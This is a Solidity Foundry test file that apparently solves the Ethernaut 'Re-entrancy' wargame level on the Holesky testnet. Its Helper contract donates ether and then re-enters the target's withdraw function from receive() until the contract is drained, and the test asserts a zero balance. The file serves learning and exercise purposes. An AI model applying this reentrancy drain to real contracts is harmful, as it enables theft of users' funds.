// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {ReEntrance} from "../../src/Ethernaut/ReEntrancy.sol";

contract ReEntrancyAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;

        vm.startPrank(playerAddress);
        Helper helper = new Helper();
        helper.withdraw{value: 0.001 ether}();
        vm.stopPrank();

        assertTrue(
            payable(0x2C41f961D78D385bDa26776Cf5CF309655cCD808).balance == 0
        );
    }
}

contract Helper {
    uint256 amount = 0.001 ether;
    ReEntrance reEntrance =
        ReEntrance(payable(0x2C41f961D78D385bDa26776Cf5CF309655cCD808));

    function withdraw() public payable {
        reEntrance.donate{value: 0.001 ether}(address(this));
        reEntrance.withdraw(amount);
    }

    receive() external payable {
        reEntrance.withdraw(amount);
    }
}
